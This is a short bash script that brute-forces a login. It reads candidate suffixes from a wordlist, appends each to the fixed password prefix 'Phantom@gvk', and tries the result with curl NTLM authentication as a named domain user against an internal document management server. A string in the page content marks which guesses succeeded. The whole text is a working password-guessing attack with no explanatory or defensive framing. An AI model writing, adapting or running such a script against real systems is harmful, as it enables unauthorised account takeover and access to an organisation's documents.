cat words.txt | while read line;
do pass="Phantom@gvk"$line; 
  num=$(curl -s -u 'example.com\name.lname:'$pass  --ntlm http://10.65.127.8:80/DMS/ | grep -in 'DocumentView.aspx' | cut -d ':' -f 1 | head -n 1 ) ;
  if [[ 2 -eq $num ]];
    then
      echo "[+] $pass : OK";
    else
      echo "[-] $pass : FAIL";
  fi ;
done
